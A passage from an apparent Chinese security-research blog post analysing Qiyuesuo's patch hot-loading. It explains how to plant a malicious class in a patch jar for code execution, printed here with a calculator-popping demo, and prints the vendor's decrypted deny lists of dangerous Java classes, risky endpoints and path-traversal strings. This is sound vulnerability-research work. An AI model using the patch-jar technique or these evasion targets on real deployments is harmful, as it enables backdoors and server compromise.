+<p>com.qiyuesuo.security.patch.loader.SecurityLibManager#deployScheduler就是进行热加载的地方。</p>
+<p>这里会检查patch的sha1值，如果发现变化，就会重新进行加载。</p>
+<p>我们跟进一下this.reload：<br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761997992402-1bf234b3-64b4-4a8b-965a-7e0d70d7e8bb.png"  alt="img"></p>
+<p>使用自定义的SecurityLibClassLoader去加载patchJar，然后指定targetLibClassLoader为当前线程的上下文类加载器，这样当前线程就能从patchJar中进行类加载。</p>
+<p>然后回去跟进this.registerQVDLogic：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761998116104-802fde1a-94fc-4c42-a074-dd1413195008.png"  alt="img"></p>
+<p>跟进readAndLoadClassNameFromJar方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761998237895-3bb24f83-093e-44b5-a246-572b2b41d274.png"  alt="img"></p>
+<p>这里会load patchJar里面的所有类，并返回一个列表，里面都是相应的className。</p>
+<p>回到registerQVDLogic，这次跟进this.registerFilterLogic：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761998544067-978df06e-d4b2-4301-8519-a5b4d330f057.png"  alt="img"></p>
+<p>这里会初始化com.qiyuesuo.security.patch.filter.logic包中的类，所以我们知道了该如何构造恶意patchJar。</p>
+<p>向com.qiyuesuo.security.patch.filter.logic包中添加恶意类即可。为了让恶意类能够第一个顺利加载，需要设置恶意类名为AAAAxxxx。</p>
+<p>直接打开jar，往里面拖文件即可：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761998727604-96c8179a-9209-4968-a5ba-b04f25e9c289.png"  alt="img"></p>
+<p>顺利加载：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761998836534-0bc91923-3771-4bba-b05e-84e48112f3be.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761998754788-bd284b54-e699-468e-9251-e93cf481134e.png"  alt="img"></p>
+<p>但是有一个现象，在断点停下前，会先打印两次，弹两次计算器，然后才在断点处停下，之后弹第三次计算器，那么前两次是为什么呢？我试过在Runtime.exec处打断点，但是前两次也无法停下。</p>
+<p>有时候又是先在断点停下，但是还没到恶意类初始化的地方，就跳出两次计算器。</p>
+<h2 id="多次热加载？"><a href="#多次热加载？" class="headerlink" title="多次热加载？"></a>多次热加载？</h2><p>下面的内容全是问killer师傅才知道的，再次感谢killer师傅的耐心解答。</p>
+<p>断点下了，一定是能断住的，除非触发热加载的不是这个进程。</p>
+<p>我们回想一下，契约锁应用是不是默认会开三个端口，而这三个端口，都是独立的springboot应用，也就是说，这是三个独立的进程。</p>
+<p>说到这里，已经有些眉目了，大概率是因为三个进程都各自加载了一遍补丁，所以才会触发三次恶意类初始化。</p>
+<p>但是还需要验证。这里需要用到一个新工具：Process Monitor</p>
+<p>打开后我们需要在Filter菜单加两条过滤规则：</p>
+<p>将进程名设置为java.exe：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762000006325-6b41c03a-19ce-4dfc-8754-1199612869e1.png"  alt="img"></p>
+<p>将操作设置为ReadFile：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762000057565-367b6d22-5bef-49c2-869f-347757686842.png"  alt="img"></p>
+<p>全部add后，点击apply应用。</p>
+<p>接着快捷键ctrl+x，把之前的都清除。然后重复前面的恶意jar热加载，记得idea别开断点。</p>
+<p>等三次计算器全弹出后，按ctrl+e，暂停捕捉。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762000383246-02870c87-4cbd-4bb5-bcdb-7c34b951a16c.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762000399522-82d0d1e9-4d43-431d-9d75-12b1f3b16393.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762000420178-84750849-8198-42c1-b58f-623fb0470880.png"  alt="img"></p>
+<p>这里可以看到，23656，2692，22660进程依次加载了恶意patchJar，并打开了计算器。我们查一下进程号对应的端口：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762000555021-73e1ce38-ca77-4fcd-aabe-4273a88647c9.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762000576683-1d7eecad-e4f8-4805-a078-aa3b9b6f160e.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762000589797-1b6ebd3e-604c-48dc-a299-f9b1e57efe01.png"  alt="img"></p>
+<p>分别对应了9180，9182，9181</p>
+<p>所以，如果这次idea打断点的话，就会先停下，然后执行到热加载前就弹出两次计算器。</p>
+<p>到这里，为什么弹出三次计算器的问题终于得到了解决。</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><h2 id="security-rsc"><a href="#security-rsc" class="headerlink" title="security.rsc"></a>security.rsc</h2><p>解密后会自动输出到日志，所以可以直接到日志中查看：</p>
+<p>logs&#x2F;console.log</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761909687553-38c986c0-f233-4645-bb76-63fab21945ed.png"  alt="img"></p>
+<p>这是1.3.7版本补丁的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line">Key: SweepCodePreventLogic.LOWER_URI</span><br><span class="line">Value: ^/contract/sweepcode/detail/\d&#123;19&#125;$</span><br><span class="line">===================</span><br><span class="line">Key: DangerOpenUrlLogic.RISK_URI</span><br><span class="line">Value: /thirdintegration/save</span><br><span class="line">===================</span><br><span class="line">Key: DbTestPreventLogic.RISK_UPGRADE_URI</span><br><span class="line">Value: /setup/dbtest</span><br><span class="line">Value: /api/setup/dbtest</span><br><span class="line">===================</span><br><span class="line">Key: PinCatchPreventLogic.RISK_URI</span><br><span class="line">Value: /login/pin</span><br><span class="line">Value: /api/login/pin</span><br><span class="line">===================</span><br><span class="line">Key: PdfverifierPreventWrapper.OTHER</span><br><span class="line">Value: .jar</span><br><span class="line">Value: .sh</span><br><span class="line">Value: .bat</span><br><span class="line">Value: .py</span><br><span class="line">Value: .class</span><br><span class="line">Value: .java</span><br><span class="line">Value: .bash</span><br><span class="line">Value: .so</span><br><span class="line">===================</span><br><span class="line">Key: PdfverifierPreventWrapper.PARAM</span><br><span class="line">Value: ../</span><br><span class="line">===================</span><br><span class="line">Key: UAPreventLogic.RISK_URI</span><br><span class="line">Value: /user/add</span><br><span class="line">Value: /api/user/add</span><br><span class="line">===================</span><br><span class="line">Key: CustomCodePreventLogic.UPLOAD_URL_LIST</span><br><span class="line">Value: /utask/upload</span><br><span class="line">Value: /api/code/upload</span><br><span class="line">Value: /code/upload</span><br><span class="line">Value: /api/sys/config/storage/custom/upload</span><br><span class="line">Value: /sys/config/storage/custom/upload</span><br><span class="line">Value: /api/sys/config/convert/upload</span><br><span class="line">Value: /sys/config/convert/upload</span><br><span class="line">Value: /api/message/strategy/upload</span><br><span class="line">Value: /message/strategy/upload</span><br><span class="line">Value: /code/seal/upload</span><br><span class="line">Value: /api/code/seal/upload</span><br><span class="line">Value: /code/category/upload</span><br><span class="line">Value: /api/code/category/upload</span><br><span class="line">===================</span><br><span class="line">Key: TemplateParamUtils.REGEX</span><br><span class="line">Value: ^[\+\-\*/\.\(\)0-9\s]+$</span><br><span class="line">===================</span><br><span class="line">Key: PdfverifierPreventWrapper.TYPE</span><br><span class="line">Value: ofd</span><br><span class="line">===================</span><br><span class="line">Key: Qvd12Filter.BASIC_PATHS</span><br><span class="line">Value: /favicon.ico</span><br><span class="line">Value: /qyswebapp/assets</span><br><span class="line">Value: /qys/webapp/basePath</span><br><span class="line">Value: /license/checkExpire</span><br><span class="line">Value: /api/license/checkExpire</span><br><span class="line">Value: /checkHealth</span><br><span class="line">Value: /login?service</span><br><span class="line">===================</span><br><span class="line">Key: SecurityPropertiesManager.ADDITIONAL_URL_LISTS</span><br><span class="line">Value: /qyswebapp/assets/auth/**</span><br><span class="line">Value: /qyswebapp/assets/avatar/**</span><br><span class="line">Value: /qyswebapp/assets/css/**</span><br><span class="line">Value: /qyswebapp/assets/db/**</span><br><span class="line">Value: /qyswebapp/assets/favicon.ico</span><br><span class="line">Value: /qyswebapp/assets/fonts/**</span><br><span class="line">Value: /qyswebapp/assets/i18n/**</span><br><span class="line">Value: /qyswebapp/assets/img/**</span><br><span class="line">Value: /qyswebapp/assets/js/**</span><br><span class="line">Value: /qyswebapp/assets/logo/**</span><br><span class="line">Value: /qyswebapp/assets/oa/**</span><br><span class="line">Value: /qyswebapp/assets/views/**</span><br><span class="line">Value: /qyswebapp/assets/cmaps/**</span><br><span class="line">Value: /qysoss/assets/auth/**</span><br><span class="line">Value: /qysoss/assets/avatar/**</span><br><span class="line">Value: /qysoss/assets/css/**</span><br><span class="line">Value: /qysoss/assets/db/**</span><br><span class="line">Value: /qysoss/assets/favicon.ico</span><br><span class="line">Value: /qysoss/assets/fonts/**</span><br><span class="line">Value: /qysoss/assets/i18n/**</span><br><span class="line">Value: /qysoss/assets/img/**</span><br><span class="line">Value: /qysoss/assets/js/**</span><br><span class="line">Value: /qysoss/assets/logo/**</span><br><span class="line">Value: /qysoss/assets/oa/**</span><br><span class="line">Value: /qysoss/assets/views/**</span><br><span class="line">Value: /assets/auth/**</span><br><span class="line">Value: /assets/avatar/**</span><br><span class="line">Value: /assets/css/**</span><br><span class="line">Value: /assets/db/**</span><br><span class="line">Value: /assets/favicon.ico</span><br><span class="line">Value: /assets/fonts/**</span><br><span class="line">Value: /assets/i18n/**</span><br><span class="line">Value: /assets/img/**</span><br><span class="line">Value: /assets/js/**</span><br><span class="line">Value: /assets/logo/**</span><br><span class="line">Value: /assets/oa/**</span><br><span class="line">Value: /assets/views/**</span><br><span class="line">Value: /assets/cmaps/**</span><br><span class="line">===================</span><br><span class="line">Key: TemplateParamUtils.PATTERN</span><br><span class="line">Value: \&#123;.*?\&#125;</span><br><span class="line">===================</span><br><span class="line">Key: PinLoginPreventLogic.NAME</span><br><span class="line">Value: service</span><br><span class="line">===================</span><br><span class="line">Key: SecurityVersionInfoLogic.METHOD</span><br><span class="line">Value: getSecurityPatchAutoDownload</span><br><span class="line">===================</span><br><span class="line">Key: PdfverifierPreventWrapper.SENSITIVE_URL</span><br><span class="line">Value: /document/createbyofd</span><br><span class="line">Value: /api/document/createbyofd</span><br><span class="line">===================</span><br><span class="line">Key: CustomCodeRequestWrapper.ADJACENT_SEMICOLON_REGEX</span><br><span class="line">Value: ;\s*;</span><br><span class="line">===================</span><br><span class="line">Key: SecurityPropertiesManager.RISK_URL_LISTS</span><br><span class="line">Value: /user/change/mobile</span><br><span class="line">Value: /user/mobile/pin</span><br><span class="line">Value: /user/voice/pin</span><br><span class="line">Value: /api/user/change/mobile</span><br><span class="line">Value: /api/user/mobile/pin</span><br><span class="line">Value: /api/user/voice/pin</span><br><span class="line">Value: /user/get/account</span><br><span class="line">Value: /qyswebapp/assets/**</span><br><span class="line">Value: /qysoss/assets/**</span><br><span class="line">Value: /assets/**</span><br><span class="line">===================</span><br><span class="line">Key: SweepCodePreventLogic.OVER_434_REGEX</span><br><span class="line">Value: Xig/PS4qXGJfPVswLTldezEzfVxiKSg/PS4qXGJpZD1bMC05XXsxOX1cYikoPz0uKlxic2lnbmF0b3J5SWQ9WzAtOV17MTl9XGIpLiskCg</span><br><span class="line">===================</span><br><span class="line">Key: DangerUrlPreventLogic.RISK_URI</span><br><span class="line">Value: /assets/loadResource</span><br><span class="line">Value: /api/assets/loadResource</span><br><span class="line">===================</span><br><span class="line">Key: DangerUrlForbiddenLogic.RISK_URI</span><br><span class="line">Value: /api/actuator</span><br><span class="line">Value: /actuator</span><br><span class="line">Value: /v3/api-docs</span><br><span class="line">Value: /api/v3/api-docs</span><br><span class="line">===================</span><br><span class="line">Key: DocumentParamPreventLogic.TEMPLATE_URI_LIST</span><br><span class="line">Value: /v2/contract/edit</span><br><span class="line">Value: /v2/contract/create</span><br><span class="line">Value: /contract/create</span><br><span class="line">Value: /contract/createRetainParams</span><br><span class="line">Value: /contract/edit</span><br><span class="line">Value: /contract/fillparam</span><br><span class="line">Value: /api/contract/create</span><br><span class="line">Value: /api/contract/doc/edit</span><br><span class="line">Value: /api/contract/fillparam</span><br><span class="line">Value: /contract/create</span><br><span class="line">Value: /contract/doc/edit</span><br><span class="line">Value: /contract/fillparam</span><br><span class="line">Value: /contract/createbycategory</span><br><span class="line">===================</span><br><span class="line">Key: NetCheckPreventLogic.URI</span><br><span class="line">Value: /api/netCheck/setConfig</span><br><span class="line">Value: /netCheck/setConfig</span><br><span class="line">===================</span><br><span class="line">Key: SweepCodePreventLogic.LOWER_434_REGEX</span><br><span class="line">Value: Xig/PS4qXGJfPVswLTldezEzfVxiKSg/PS4qXGJzaWduYXRvcnlJZD1bMC05XXsxOX1cYikuKyQK</span><br><span class="line">===================</span><br><span class="line">Key: UploaderPreventLogic.RISK_URI</span><br><span class="line">Value: /file/uploader/merge</span><br><span class="line">Value: /api/file/uploader/merge</span><br><span class="line">===================</span><br><span class="line">Key: CustomCodeRequestWrapper.MULTIPLE_WHITESPACE_REGEX</span><br><span class="line">Value: import\s</span><br><span class="line">===================</span><br><span class="line">Key: UpgradePreventLogic.RISK_UPGRADE_URI</span><br><span class="line">Value: /upgrade</span><br><span class="line">Value: /api/upgrade</span><br><span class="line">Value: /update</span><br><span class="line">Value: /api/update</span><br><span class="line">===================</span><br><span class="line">Key: UploaderPreventLogic.REGEX</span><br><span class="line">Value: type</span><br><span class="line">===================</span><br><span class="line">Key: CustomCodeRequestWrapper.IMPORT_REGEX</span><br><span class="line">Value: ^import\s+(static\s+)?[a-zA-Z_][a-zA-Z0-9_]*(\.[a-zA-Z_][a-zA-Z0-9_]*)*\s*;$</span><br><span class="line">===================</span><br><span class="line">Key: CustomCodeRequestWrapper.SENSITIVE_KEY_LISTS</span><br><span class="line">Value: Runtime</span><br><span class="line">Value: Process</span><br><span class="line">Value: ProcessBuilder</span><br><span class="line">Value: SpelExpressionParser</span><br><span class="line">Value: invoke</span><br><span class="line">Value: Class.forName</span><br><span class="line">Value: newInstance</span><br><span class="line">Value: ClassLoader</span><br><span class="line">Value: Constructor</span><br><span class="line">Value: ObjectInputStream</span><br><span class="line">Value: ScriptEngine</span><br><span class="line">Value: parseExpression</span><br><span class="line">Value: getDeclaredField</span><br><span class="line">Value: setAccessible</span><br><span class="line">Value: getMethod</span><br><span class="line">Value: lookup</span><br><span class="line">Value: freemarker</span><br><span class="line">Value: security</span><br><span class="line">Value: Base64</span><br><span class="line">Value: SerializationUtils</span><br><span class="line">Value: deserialize</span><br><span class="line">Value: static</span><br><span class="line">Value: Yaml</span><br><span class="line">Value: JdbcRowSetImpl</span><br><span class="line">Value: Transformer</span><br><span class="line">Value: AgentManager</span><br><span class="line">Value: JARSoundbankReader</span><br><span class="line">Value: Ognl</span><br><span class="line">Value: DefaultExecutor</span><br><span class="line">Value: hutool</span><br><span class="line">Value: Base16</span><br><span class="line">Value: Base32</span><br><span class="line">Value: Base58</span><br><span class="line">Value: Base62</span><br><span class="line">Value: Base64</span><br><span class="line">Value: Base85</span><br><span class="line">Value: Base91</span><br><span class="line">Value: eval(</span><br><span class="line">===================</span><br><span class="line">Key: DangerOpenUrlLogic.RISK_STRING</span><br><span class="line">Value: J6WPW25eHj</span><br><span class="line">===================</span><br><span class="line">Key: SecurityVersionInfoLogic.URL</span><br><span class="line">Value: /security/info</span><br><span class="line">===================</span><br><span class="line">Key: PinLoginPreventLogic.PARAM</span><br><span class="line">Value: applicantChange</span><br><span class="line">Value: userName</span><br><span class="line">Value: contact</span><br><span class="line">Value: corpName</span><br><span class="line">===================</span><br><span class="line">Key: UpgradePreventLogic.RISK_UPGRADE_EXCLUDE_URI</span><br><span class="line">Value: /upgrade/status</span><br><span class="line">Value: /upgrade/sqldetail</span><br><span class="line">Value: /api/upgrade/status</span><br><span class="line">Value: /api/upgrade/sqldetail</span><br><span class="line">Value: /update/password/pin</span><br><span class="line">Value: /api/update/password/pin</span><br><span class="line">Value: /update/password</span><br><span class="line">Value: /api/update/password</span><br><span class="line">Value: /upgrade/detail/download</span><br><span class="line">Value: /upgrade/error/servicedetail</span><br><span class="line">Value: /upgrade/error/sqldetail</span><br><span class="line">Value: /upgrade/errordetail</span><br><span class="line">===================</span><br><span class="line">Key: UAPreventLogic.METHOD</span><br><span class="line">Value: getRegisterPersonAccount</span><br><span class="line">===================</span><br><span class="line">Key: SweepCodePreventLogic.PRE_URI</span><br><span class="line">Value: /contract/sweepcode/detail</span><br><span class="line">Value: /api/contract/sweepcode/detail</span><br><span class="line">===================</span><br><span class="line">Key: TemplateParamRequestWrapper.TEMPLATE_PARAM_URI</span><br><span class="line">Value: /api/template/param/edits</span><br><span class="line">Value: /template/param/edits</span><br><span class="line">Value: /api/template/html/update</span><br><span class="line">Value: /template/html/update</span><br><span class="line">===================</span><br><span class="line">Key: PinLoginPreventLogic.RISK_URI</span><br><span class="line">Value: /login</span><br><span class="line">Value: /api/login</span><br><span class="line">===================</span><br><span class="line">Key: SweepCodePreventLogic.METHOD_2</span><br><span class="line">Value: get</span><br><span class="line">===================</span><br><span class="line">Key: SweepCodePreventLogic.METHOD_1</span><br><span class="line">Value: set</span><br><span class="line">===================</span><br><span class="line">Key: TemplateParamRequestWrapper.TEMPLATE_HTML_URI</span><br><span class="line">Value: /template/html/add</span><br><span class="line">Value: /api/template/html/add</span><br><span class="line">===================</span><br><span class="line">Key: UploaderPreventLogic.PARAM</span><br><span class="line">Value: html</span><br><span class="line">===================</span><br><span class="line">Key: SweepCodePreventLogic.RISK_URI</span><br><span class="line">Value: /contract/sweepcode/pin</span><br><span class="line">Value: /api/contract/sweepcode/pin</span><br><span class="line">===================</span><br><span class="line">Key: SweepCodePreventLogic.LOWER_URI_API</span><br><span class="line">Value: ^/api/contract/sweepcode/detail/\d&#123;19&#125;$</span><br><span class="line">===================</span><br><span class="line">Key: CustomCodePreventLogic.METHOD</span><br><span class="line">Value: inInnerCompany</span><br><span class="line">===================</span><br><span class="line">Key: Qvd12Filter.RETRIEVE_WHITELIST_PATHS</span><br><span class="line">Value: /company/retrieve</span><br><span class="line">Value: /api/company/retrieve</span><br><span class="line">Value: /captcha</span><br><span class="line">Value: /api/captcha</span><br><span class="line">Value: /user</span><br><span class="line">Value: /api/user</span><br><span class="line">Value: /user/auth</span><br><span class="line">Value: /api/user/auth</span><br><span class="line">Value: /login/</span><br><span class="line">Value: /api/login/</span><br><span class="line">Value: /apidsz/random</span><br><span class="line">Value: /api/apidsz/random</span><br><span class="line">Value: /sys/config</span><br><span class="line">Value: /api/sys/config</span><br><span class="line">Value: /css</span><br><span class="line">Value: /api/css</span><br><span class="line">Value: /checkHealth</span><br><span class="line">Value: /api/checkHealth</span><br><span class="line">===================</span><br><span class="line">Key: PinCatchPreventLogic.NAME</span><br><span class="line">Value: applicantChange</span><br><span class="line">===================</span><br><span class="line">Key: DangerOpenUrlLogic.PARAM_NAME</span><br><span class="line">Value: x-qys-accesstoken</span><br><span class="line">===================</span><br><span class="line">Key: PdfverifierPreventLogic.PDFVERIFIER_URL_LIST</span><br><span class="line">Value: /api/pdfverifier</span><br><span class="line">Value: /pdfverifier</span><br><span class="line">Value: /api/file/uploader/chunk</span><br><span class="line">Value: /file/uploader/chunk</span><br><span class="line">Value: /api/document/createbyfile</span><br><span class="line">Value: /document/createbyfile</span><br><span class="line">Value: /document/createbyofd</span><br><span class="line">Value: /api/document/createbyofd</span><br><span class="line">===================</span><br><span class="line">Key: CustomCodeDealLogic.URL_LIST</span><br><span class="line">Value: /api/code/download</span><br><span class="line">Value: /code/download</span><br><span class="line">===================</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当然，查看解密代码，自己写脚本解密也行：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761909980803-143ada56-43c2-4205-becd-e682fc9b1695.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761909993485-04779dfc-ea76-44e3-b8fa-409bfc3adac9.png"  alt="img"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.qiyuesuo.security.encrypt.RSAUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">decRsc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        decodeRsc(<span class="string">&quot;security.rsc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span 